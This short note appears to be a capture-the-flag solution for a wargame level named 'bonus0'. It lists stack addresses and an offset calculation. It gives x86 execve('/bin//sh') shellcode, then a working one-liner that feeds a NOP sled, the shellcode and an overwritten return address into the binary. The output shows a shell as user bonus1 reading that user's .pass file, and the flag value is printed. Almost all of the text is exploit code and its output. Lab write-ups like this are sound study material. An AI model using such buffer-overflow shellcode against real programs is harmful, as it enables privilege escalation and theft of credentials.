start of buffer: 0xbffff6f6

buffer end addr:	0xbffff733
					0xb7fd0ff4


buffer's end addr: 0xbffff72c


4096 buffer start addr: 0xbfffe660   \x60\xe6\xff\xbf


shellcode : 
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

0xbffff730 - 0xbffff6f6 = 0x14 = 20


```sh
$> (python -c 'print("\x90"*1000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")'; python -c 'print("\x90"*9 + "\xc0\xe6\xff\xbf" + "\x90"*7)'; cat) | ./bonus0
 - 
 - 
[...]
whoami
bonus1
cat /home/user/bonus1/.pass 
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
